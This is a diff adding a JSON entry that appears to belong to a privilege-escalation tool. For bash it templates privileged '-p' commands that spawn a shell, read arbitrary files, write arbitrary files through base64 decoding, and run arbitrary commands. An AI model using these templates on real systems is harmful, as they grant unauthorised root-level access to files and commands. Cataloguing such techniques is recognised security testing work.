@@ -1,0 +1,12 @@
+[
+	{
+		"name": "bash",
+		"shell": "{path} -p", 
+		"read_file": "{path} -p -c \"cat {lfile}\"",
+		"write_file": {
+			"type": "base64",
+			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+		},
+		"command": "{path} -p -c {command}"
+	}
+]
